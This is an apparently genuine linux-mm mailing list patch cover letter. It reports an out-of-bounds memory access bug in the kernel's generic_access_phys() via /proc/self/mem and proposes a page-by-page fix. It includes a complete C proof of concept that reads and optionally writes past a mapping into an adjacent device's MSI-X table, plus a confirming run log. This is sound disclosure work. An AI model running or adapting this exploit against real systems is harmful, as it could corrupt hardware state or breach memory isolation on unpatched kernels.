Return-Path: <owner-linux-mm@kvack.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id CA397C44529
	for <linux-mm@archiver.kernel.org>; Tue, 21 Jul 2026 14:26:17 +0000 (UTC)
Received: by kanga.kvack.org (Postfix)
	id A2C266B008C; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 9B6836B0096; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id 8569F6B00A6; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
	by kanga.kvack.org (Postfix) with ESMTP id 443396B008C
	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 10:26:16 -0400 (EDT)
Received: from smtpin20.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay10.hostedemail.com (Postfix) with ESMTP id C1562C01B1
	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 14:26:15 +0000 (UTC)
X-FDA: 85013008710.20.28A7FAC
Received: from mail-pf1-f181.google.com (mail-pf1-f181.google.com [209.85.210.181])
	by imf09.hostedemail.com (Postfix) with ESMTP id 0BCE014000E
	for <linux-mm@kvack.org>; Tue, 21 Jul 2026 14:26:13 +0000 (UTC)
Authentication-Results: imf09.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=mQk8CYmo;
	spf=pass (imf09.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.210.181 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1784643974;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:references:dkim-signature;
	bh=osLIikjLm/wHb9USOVWA5AXNj0oMUDP0p1YYS5t0Rrc=;
	b=e/a86mgYLB6FZpA6ZamV0v4ns67mSwxIy1s+G0d13OUPmgu+1Ruc+0Zyh5KeTEJqXvM9iV
	kiPnM/SFzu8SgDiiCR1cGNR8Q1IkQ4yct23Am4pr6zhSmG+IP90E+A3mZQoNo+UQWy4fiY
	Ph31L+R6Yq3U7Fya+hHaBIU7nOZ9DqY=
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1784643974;
	b=Xe65Zr5BfcmmFfMP0avPdy2z+dtnF8pilCFfZ/Ut2k54efYWha0Yq2zgbaQIFndGPvOMu9
	OOQWyqxoLECz9+u6ZpyJHjBHStCaUs6dHZPFyQfzmx5uypDNUZ5uVWC8P+jubkl0Fw18uF
	Vr8Ma5qOssgDM/w7qCr1+cQzw/r620A=
ARC-Authentication-Results: i=1;
	imf09.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=mQk8CYmo;
	spf=pass (imf09.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.210.181 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
Received: by mail-pf1-f181.google.com with SMTP id d2e1a72fcca58-84847482584so3834040b3a.0
        for <linux-mm@kvack.org>; Tue, 21 Jul 2026 07:26:13 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784643973; x=1785248773; darn=kvack.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=osLIikjLm/wHb9USOVWA5AXNj0oMUDP0p1YYS5t0Rrc=;
        b=mQk8CYmogQf+R8W7EEJjDjzTd0rXWdZBO8KWDF0fvCY9Q3QyfFfHZXpUBCKqfTS7AH
         UxIB7Pg5/CqO1iYoPa6/Cdx/I7L6zKKDiGlsQPFZjBICsHrC3JT/hZQqb3PcY0QwpaRl
         1we+HUL5U2X7heGnl9YxgAq/yUWPaWE6DGL9X9Gz63w3UBshRGpGUBtCkS4g7/nz5xMU
         +0m0usECPulZfZyYKvws/Ltj8lrQZsgeqwL3ILvHHi1feRy7K/+oyI/+DM/mjPHouQsj
         xoCwl8FnjvRk5P8r1R2ZlHskSsh2osjaVmVTE6j7Fws/EWauJdoYvyxbkefERnRQa7ZQ
         /z6A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784643973; x=1785248773;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=osLIikjLm/wHb9USOVWA5AXNj0oMUDP0p1YYS5t0Rrc=;
        b=MX2nSk+dMpyJjzbNmRxB6xUe0MzRGUvZRRGg3Asmc1p9S8t+gsbuHk5yOsTwc6BJ8V
         LF7hENcIzMiaJlcEmJfIsTUXWm5DuATnXJjdNa7jn+bYW0awK1vwAdEVG3N5ixH6Q9Hk
         DQqvbuLQ/y9hr2QB42ftkbP0n/5L5UnFwNY2eBq3zo+XZs3c5gak6Jvuoyt1CSLoXGjU
         MTQZdLRAEg244VNdK80hMmu/mGKo5VbkoXQRBmuAf49X7d+sjUCDoLpsinvGL+f7LAeA
         DeRvubAhwd7ILI+tj0QNLNCVVeunWb2Bt6uOWBit46mCxBI5v+mJ3ShFJSnDmEHZkyHN
         xd9g==
X-Gm-Message-State: AOJu0YyyAs0s+tvcDT4UYusuI8To2yMxivTtaqPBlfVZ49pVfzTYRW/U
	UMOS0phSwzmS7LcoObL/dgDN+Q76H83NCcEFZRVIoW6d/f5EJfls4ysciUr619GY
X-Gm-Gg: AR+sD139WWyaPnP91veJW/DFgRmFfMEHfSXmHhOMPG0o7PgUqj+FUJwLDqdRd29b12m
	kq0/jrtlUh55qBLKzOaz4K4GOK8ecA7dfhBz4c58YGYPISPi7LC0/qjpxjAc5AeO3azp++n6GFy
	aqxgGlojSFbu3lombACb3AQxPUMnjTmAGmnEYRHQ2d1s9ASrZA/k48vO00SQF/crIdZ2tON0ZnJ
	XmoBvsrVOb/cQlonQGsgbVq/ioN1qbpy+R5FMjafM9S3OQyqOgH3xTKZrleIWTm3Fua5RDw+nV+
	dyVbcm1PKE+j966gtvn5CzBuE8H1pcmAtkf0dwJzYxXUvzpOUAYPbPYbeb3WtnLF/XdO/5/yctr
	vBwLpyNebaKIArNUi2fBSGD7DCQ1cA4aOph6ADa66qXQ/KAQXSp/4zXzVfT0vMSJYdqR80MyXtF
	xaQsIzI0sySeVQamSY2w==
X-Received: by 2002:a05:6a00:1390:b0:848:2f58:e1e9 with SMTP id d2e1a72fcca58-84beb54b717mr24287612b3a.36.1784643972625;
        Tue, 21 Jul 2026 07:26:12 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84c2af7acf4sm7647371b3a.51.2026.07.21.07.26.07
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 21 Jul 2026 07:26:12 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-mm@kvack.org
Cc: akpm@linux-foundation.org,
	david@kernel.org,
	ljs@kernel.org,
	liam@infradead.org,
	vbabka@kernel.org,
	rppt@kernel.org,
	surenb@google.com,
	mhocko@suse.com,
	notasas@gmail.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] mm: fix out-of-bounds access in generic_access_phys
Date: Tue, 21 Jul 2026 22:26:03 +0800
Message-ID: <cover.1784428532.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Rspamd-Server: rspam10
X-Rspamd-Queue-Id: 0BCE014000E
X-Stat-Signature: 4ndag9hwegfw7cxhitap9ofnfcny17n7
X-Rspam-User: 
X-HE-Tag: 1784643973-972951
X-HE-Meta: U2FsdGVkX19ATpO42TzAkSIwFWD18M21yHo8zlyctWMEwng+ND7b9yyLW7OTi2ZXCudDQ9kMFNaxRaVKbRW4wnhYiiFAKdRnSDtTo4Tm2Thwt7R3XPYrJouOKevqb4NKmrN5VSgFlkfzcqisqzcmTzSm2JtzAcR8PrPpz89YqKfEIJfGEDDSFqu/RSXixKUUmIkzo3B7AaliD8In1+JtjzIfIkR5FcpTyrzptCTjvDJXIE1L3P9yoNc9luXjCZPaEu5o/VhzUcyAj8xIPhjIZ+75eO1gbKv/8gDeWWKzPU1Magjmtc+G2lcF/6dR6XEYHf0vvxOd7+ZRslKKg8hh2dJ6mPwFlbMGqxo4oy5vy1aBr3BWtb1ixgNDdOMxGMb2PPejAJxar3J7VxAqybZIxaWEsH+dnXBroUwMWpWEyUiL1jZj7lSQ7Vy655GsJ/UAlfR5PNC0gEDUnsjGCLqDQslvrT7ZzBKQzyRe+wZQFRYKRpLDnvpolD9n13Y4zXuEIv5tv80R1LgJ4rkAKAjsALVxktNIcyIsJU++JRxGhPkqgNI1owMbiOGswM47alcMWrEvSZ4Yunv1iu4gn3KPw/9g9PwGrOwhlJwTd5wb8BYaFuMpHxeGQilb8X4KXI8ngcFR3ao21XIhxDHcNedu9pcqQ35kHquWGOGXXL0XdDU/UivnVmyU1MXHD9WQRd7Rc6ocP3KDSAM9oYDCkGbloIcfFYgWpdqorVN0zO7A8iSaHXHi87waJpP0yGatb8PoGCVwyd3OFtaN5qja/JLHfdcBCXTfziNXV+TAi+0s20PqRLuUDAu/0tO3i8to/G5atcheTAcFvmbXSyXyK/EYY63IsvsHlpA89CjEsDi5YCCrHbDSBQj8dHPyLe1WSzPX/zHQ8w9eCbvvrDE/CvRW072jI69qeIRbOWAT4BT/6QkuX84JI96rlKbzRpw5Zpl6rsV24PdQ26UvE6CA6sz
 02o7sEKj
 eycZhLnFdymPhIKwYWEF2B9iaqq2Jo8Or27W+mo0mIK4Mdf/8R9I/oEi7r3agQsRbNABEEblR2nP25XK12Ux1u6bSu3WgIVb6nGuvsqUZvZpBxVZsXM48DZHglavBam6gRliHyEkJYlALa5UvZCorVV0ktYTwMIJkhjhqzejmSHNmvb7OgOrE6rF3RyJeez6Hjy13BJNGGklY15ok76UK/oLuphQTljJg08qnjEvsU2J9Pio+pWgPhkoXxFlHXMaGoH7UMUaCBu01Z+KthbewMoFBhE6+9DMnhu0xIcRKUv1KaDfByrc+zUSbw5EJ4N/tVdfVYSSMQCfI06ylxQX7zNC7wimLksPal+OMywaZOACTBMuslwX9E30YlImEbWQpGseqqetQhkJlD+jPh1e4ULEY/BnZyYYCin/8MhGx68bYhz477oKOqHnjyCY7hFAj4vJ8Z7+shL5Od8V2Daj96KisRA==
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
List-Unsubscribe: <mailto:majordomo@kvack.org>

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in mm/memory.c. The bug is reachable by a non-root user via /proc/self/mem. We've tested it, and the proposed fix addresses the vulnerability without affecting other functionality.

We provide the detailed information about the bug below, along with a PoC to trigger it.

---- details below ----

Bug details:

The generic_access_phys() function in mm/memory.c fails to properly validate the memory access range when handling requests, such as those made via /proc/self/mem. It validates only the start address using follow_pfnmap_start() and then proceeds to ioremap the entire requested length. It does not verify if the access range stays within the VMA boundaries or if it crosses into adjacent physical/MMIO mappings.

This behavior allows an attacker to perform out-of-bounds (OOB) reads or writes by providing a length that spans across the end of the current VMA, leading to unauthorized access to adjacent memory regions.

The fix involves iterating through the access request in page-sized chunks. For each chunk, we verify the validity of the current PFNMAP entry, map only the necessary page, perform the I/O operation, and immediately unmap it. This ensures the access is strictly bound to authorized memory regions.

Reproducer:

gcc -O2 -static -o poc poc.c
unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define PAGE_SZ 4096U
#define DEFAULT_BASE "/sys/bus/pci/devices/0000:00:02.0/resource2"
#define DEFAULT_NEXT "/sys/bus/pci/devices/0000:00:03.0/resource1"

struct config {
	const char *base_path;
	const char *next_path;
	size_t tail;
	size_t cmp_len;
	bool do_write;
	bool keep_corruption;
	bool rewrite_msix_data;
	uint32_t msix_data;
	bool rewrite_msix_addr_low;
	bool rewrite_msix_addr_high;
	uint32_t msix_addr_low;
	uint32_t msix_addr_high;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [--base PATH] [--next PATH] [--tail N] [--cmp-len N] [--write] [--keep-corruption]\n"
		"          [--rewrite-msix-data HEX] [--rewrite-msix-addr-low HEX]\n"
		"          [--rewrite-msix-addr-high HEX]\n"
		"\n"
		"Default target maps QEMU's 4 KiB VGA BAR (00:02.0 resource2) and\n"
		"uses /proc/self/mem to read or write past that VMA into the adjacent\n"
		"virtio-net MSI-X BAR page (00:03.0 resource1).\n",
		prog);
}

static void die_perror(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static size_t parse_size(const char *arg, const char *name)
{
	char *end = NULL;
	unsigned long long value;

	errno = 0;
	value = strtoull(arg, &end, 0);
	if (errno || !end || *end) {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(EXIT_FAILURE);
	}
	if (value == 0 || value > PAGE_SZ) {
		fprintf(stderr, "%s must be in range 1..%u\n", name, PAGE_SZ);
		exit(EXIT_FAILURE);
	}
	return (size_t)value;
}

static uint32_t parse_u32(const char *arg, const char *name)
{
	char *end = NULL;
	unsigned long long value;

	errno = 0;
	value = strtoull(arg, &end, 0);
	if (errno || !end || *end || value > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(EXIT_FAILURE);
	}
	return (uint32_t)value;
}

static void parse_args(int argc, char **argv, struct config *cfg)
{
	int i;

	*cfg = (struct config) {
		.base_path = DEFAULT_BASE,
		.next_path = DEFAULT_NEXT,
		.tail = 16,
		.cmp_len = 64,
		.do_write = false,
		.keep_corruption = false,
		.rewrite_msix_data = false,
		.msix_data = 0,
		.rewrite_msix_addr_low = false,
		.rewrite_msix_addr_high = false,
		.msix_addr_low = 0,
		.msix_addr_high = 0,
	};

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--base") && i + 1 < argc) {
			cfg->base_path = argv[++i];
		} else if (!strcmp(argv[i], "--next") && i + 1 < argc) {
			cfg->next_path = argv[++i];
		} else if (!strcmp(argv[i], "--tail") && i + 1 < argc) {
			cfg->tail = parse_size(argv[++i], "tail");
		} else if (!strcmp(argv[i], "--cmp-len") && i + 1 < argc) {
			cfg->cmp_len = parse_size(argv[++i], "cmp-len");
		} else if (!strcmp(argv[i], "--write")) {
			cfg->do_write = true;
		} else if (!strcmp(argv[i], "--keep-corruption")) {
			cfg->keep_corruption = true;
		} else if (!strcmp(argv[i], "--rewrite-msix-data") && i + 1 < argc) {
			cfg->do_write = true;
			cfg->rewrite_msix_data = true;
			cfg->msix_data = parse_u32(argv[++i], "rewrite-msix-data");
		} else if (!strcmp(argv[i], "--rewrite-msix-addr-low") && i + 1 < argc) {
			cfg->do_write = true;
			cfg->rewrite_msix_addr_low = true;
			cfg->msix_addr_low = parse_u32(argv[++i], "rewrite-msix-addr-low");
		} else if (!strcmp(argv[i], "--rewrite-msix-addr-high") && i + 1 < argc) {
			cfg->do_write = true;
			cfg->rewrite_msix_addr_high = true;
			cfg->msix_addr_high = parse_u32(argv[++i], "rewrite-msix-addr-high");
		} else {
			usage(argv[0]);
			exit(EXIT_FAILURE);
		}
	}

	if (cfg->tail + cfg->cmp_len > PAGE_SZ) {
		fprintf(stderr, "tail + cmp-len must fit within a single 4 KiB access\n");
		exit(EXIT_FAILURE);
	}
}

static int open_rw(const char *path)
{
	int fd = open(path, O_RDWR | O_SYNC);

	if (fd < 0)
		die_perror(path);
	return fd;
}

static void *map_page(int fd, off_t offset, const char *name)
{
	void *map;

	map = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
	if (map == MAP_FAILED)
		die_perror(name);
	return map;
}

static void hexdump(const char *label, const unsigned char *buf, size_t len)
{
	size_t i;

	printf("%s (%zu bytes):", label, len);
	for (i = 0; i < len; i++) {
		if (!(i % 16))
			printf("\n  %04zx:", i);
		printf(" %02x", buf[i]);
	}
	printf("\n");
}

static ssize_t checked_pread(int fd, void *buf, size_t len, off_t off, const char *what)
{
	ssize_t ret = pread(fd, buf, len, off);

	if (ret < 0)
		die_perror(what);
	return ret;
}

static ssize_t checked_pwrite(int fd, const void *buf, size_t len, off_t off, const char *what)
{
	ssize_t ret = pwrite(fd, buf, len, off);

	if (ret < 0)
		die_perror(what);
	return ret;
}

int main(int argc, char **argv)
{
	struct config cfg;
	unsigned char *base_map;
	unsigned char *next_map;
	unsigned char *buf;
	unsigned char *base_tail;
	unsigned char *next_bytes;
	unsigned char *payload;
	unsigned char *saved_next;
	size_t total_len;
	size_t i;
	int base_fd;
	int next_fd;
	int mem_fd;
	ssize_t ret;
	off_t mem_off;
	int rc = EXIT_FAILURE;

	parse_args(argc, argv, &cfg);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	total_len = cfg.tail + cfg.cmp_len;
	base_fd = open_rw(cfg.base_path);
	next_fd = open_rw(cfg.next_path);
	mem_fd = open("/proc/self/mem", O_RDWR);
	if (mem_fd < 0)
		die_perror("/proc/self/mem");

	base_map = map_page(base_fd, 0, cfg.base_path);
	next_map = map_page(next_fd, 0, cfg.next_path);
	buf = calloc(1, total_len);
	base_tail = calloc(1, cfg.tail);
	next_bytes = calloc(1, cfg.cmp_len);
	payload = calloc(1, total_len);
	saved_next = calloc(1, cfg.cmp_len);
	if (!buf || !base_tail || !next_bytes || !payload || !saved_next)
		die_perror("calloc");

	mem_off = (off_t)(uintptr_t)(base_map + PAGE_SZ - cfg.tail);
	printf("base mapping: %s -> %p\n", cfg.base_path, base_map);
	printf("next mapping: %s -> %p\n", cfg.next_path, next_map);
	printf("proc-self-mem offset: 0x%llx\n", (unsigned long long)mem_off);
	printf("request: start at base+0x%zx, read %zu bytes\n",
	       PAGE_SZ - cfg.tail, total_len);

	ret = checked_pread(mem_fd, buf, total_len, mem_off, "pread(/proc/self/mem)");
	printf("pread(/proc/self/mem) returned %zd bytes\n", ret);
	if ((size_t)ret != total_len) {
		fprintf(stderr,
			"short read: expected %zu bytes but got %zd\n",
			total_len, ret);
		goto out;
	}

	ret = checked_pread(mem_fd, base_tail, cfg.tail, mem_off,
			    "pread(base tail via /proc/self/mem)");
	if ((size_t)ret != cfg.tail) {
		fprintf(stderr, "short base-tail read: expected %zu bytes but got %zd\n",
			cfg.tail, ret);
		goto out;
	}

	ret = checked_pread(mem_fd, next_bytes, cfg.cmp_len,
			    (off_t)(uintptr_t)next_map,
			    "pread(next mapping via /proc/self/mem)");
	if ((size_t)ret != cfg.cmp_len) {
		fprintf(stderr, "short next-page read: expected %zu bytes but got %zd\n",
			cfg.cmp_len, ret);
		goto out;
	}

	hexdump("base tail via direct /proc/self/mem read", base_tail, cfg.tail);
	hexdump("next page via direct /proc/self/mem read", next_bytes, cfg.cmp_len);
	hexdump("cross-boundary bytes via /proc/self/mem", buf, total_len);

	if (memcmp(buf, base_tail, cfg.tail)) {
		fprintf(stderr, "base tail mismatch\n");
		goto out;
	}

	if (memcmp(buf + cfg.tail, next_bytes, cfg.cmp_len)) {
		fprintf(stderr, "next page mismatch\n");
		goto out;
	}

	printf("OOB read confirmed: bytes past the 4 KiB VMA boundary came from %s\n",
	       cfg.next_path);

	if (!cfg.do_write) {
		rc = EXIT_SUCCESS;
		goto out;
	}

	memcpy(saved_next, next_bytes, cfg.cmp_len);
	memcpy(payload, base_tail, cfg.tail);
	if (cfg.rewrite_msix_data) {
		memcpy(payload + cfg.tail, next_bytes, cfg.cmp_len);
		for (i = 0; i + 16 <= cfg.cmp_len; i += 16) {
			uint32_t *addr_low = (uint32_t *)(payload + cfg.tail + i + 0);
			uint32_t *addr_high = (uint32_t *)(payload + cfg.tail + i + 4);
			uint32_t *data = (uint32_t *)(payload + cfg.tail + i + 8);
			uint32_t *vector_ctl = (uint32_t *)(payload + cfg.tail + i + 12);

			if (cfg.rewrite_msix_addr_low)
				*addr_low = cfg.msix_addr_low;
			if (cfg.rewrite_msix_addr_high)
				*addr_high = cfg.msix_addr_high;
			if (cfg.rewrite_msix_data)
				*data = cfg.msix_data;
			*vector_ctl = 0;
		}
	} else {
		for (i = 0; i < cfg.cmp_len; i++)
			payload[cfg.tail + i] = (unsigned char)(0xa0U + (i & 0x1f));
	}

	ret = checked_pwrite(mem_fd, payload, total_len, mem_off,
			     "pwrite(/proc/self/mem)");
	printf("pwrite(/proc/self/mem) returned %zd bytes\n", ret);
	if ((size_t)ret != total_len) {
		fprintf(stderr,
			"short write: expected %zu bytes but got %zd\n",
			total_len, ret);
		goto out;
	}

	ret = checked_pread(mem_fd, next_bytes, cfg.cmp_len,
			    (off_t)(uintptr_t)next_map,
			    "verify next mapping after OOB write");
	if ((size_t)ret != cfg.cmp_len) {
		fprintf(stderr, "short next-page verify read: expected %zu bytes but got %zd\n",
			cfg.cmp_len, ret);
		goto out;
	}

	if (memcmp(next_bytes, payload + cfg.tail, cfg.cmp_len)) {
		fprintf(stderr,
			"OOB write verification failed: next mapping did not change\n");
		goto out;
	}

	hexdump("next page after OOB write", next_bytes, cfg.cmp_len);
	printf("OOB write confirmed: /proc/self/mem modified %s outside the mapped VMA\n",
	       cfg.next_path);

	if (!cfg.keep_corruption) {
		memcpy(payload, base_tail, cfg.tail);
		memcpy(payload + cfg.tail, saved_next, cfg.cmp_len);
		ret = checked_pwrite(mem_fd, payload, total_len, mem_off,
				     "restore pwrite(/proc/self/mem)");
		if ((size_t)ret != total_len) {
			fprintf(stderr, "failed to restore target bytes cleanly\n");
			goto out;
		}
		printf("restored the overwritten target bytes\n");
	}

	rc = EXIT_SUCCESS;
out:
	free(saved_next);
	free(payload);
	free(next_bytes);
	free(base_tail);
	free(buf);
	munmap(next_map, PAGE_SZ);
	munmap(base_map, PAGE_SZ);
	close(mem_fd);
	close(next_fd);
	close(base_fd);
	return rc;
}
------END poc.c--------

----BEGIN crash log----
root@syzkaller:/mnt/home_host/new_poc# ./poc
base mapping: /sys/bus/pci/devices/0000:00:02.0/resource2 -> 0x7f776a982000
next mapping: /sys/bus/pci/devices/0000:00:03.0/resource1 -> 0x7f776a981000
proc-self-mem offset: 0x7f776a982ff0
request: start at base+0xff0, read 80 bytes
[ 1503.056194][ T9289] resource: resource sanity check: requesting [mem 0x00000]
[ 1503.057925][ T9289] caller generic_access_phys+0x12b/0x4c0 mapping multiple s
pread(/proc/self/mem) returned 80 bytes
base tail via direct /proc/self/mem read (16 bytes):
  0000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
next page via direct /proc/self/mem read (64 bytes):
  0000: 00 00 e0 fe 00 00 00 00 24 00 00 00 00 00 00 00
  0010: 00 10 e0 fe 00 00 00 00 25 00 00 00 00 00 00 00
  0020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
cross-boundary bytes via /proc/self/mem (80 bytes):
  0000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
  0010: 00 00 e0 fe 00 00 00 00 24 00 00 00 00 00 00 00
  0020: 00 10 e0 fe 00 00 00 00 25 00 00 00 00 00 00 00
  0030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
OOB read confirmed: bytes past the 4 KiB VMA boundary came from /sys/bus/pci/de1
-----END crash log-----

Best regards,

Luxiao Xu

Luxiao Xu (1):
  mm: fix out-of-bounds access and race in generic_access_phys

 mm/memory.c | 79 ++++++++++++++++++++++++++++++-----------------------
 1 file changed, 45 insertions(+), 34 deletions(-)

-- 
2.43.0


